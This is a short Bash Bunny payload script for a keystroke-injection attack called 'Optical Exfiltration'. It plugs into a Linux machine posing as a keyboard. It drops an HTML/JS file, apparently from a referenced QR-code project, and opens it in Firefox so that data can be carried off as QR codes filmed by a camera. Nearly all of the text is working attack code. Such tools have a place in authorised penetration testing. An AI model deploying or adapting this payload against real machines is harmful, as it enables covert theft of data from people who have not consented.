#!/bin/bash
#
# Title:         Optical Exfiltration
# Author:        bg-wa
# Version:       1.0
# Category:      HID
# Target:        *NIX
# Attackmodes:   HID
# Sources:       Hak5 2320, https://github.com/bg-wa/QRExtractor
#
# Quick HID only attack to write an HTML/JS file to target machine
# and open a browser, to exfiltrate data Using QR Codes and a video
# recording device.
#
# | Attack Stage        | Description                              |
# | ------------------- | ---------------------------------------- |
# | SETUP               | Open vi                                  |
# | ATTACK              | Writing HTML                             |
# | FINISH              | Browser Ready                            |
#

ATTACKMODE HID
LED SETUP

payload_dir=/root/udisk/payloads/$SWITCH_POSITION
source_html=$payload_dir/index.min.html
target_html=\~\/index.html


LED ATTACK

DROP LINUX $source_html $target_html

Q STRING firefox "$target_html"
Q ENTER

LED FINISH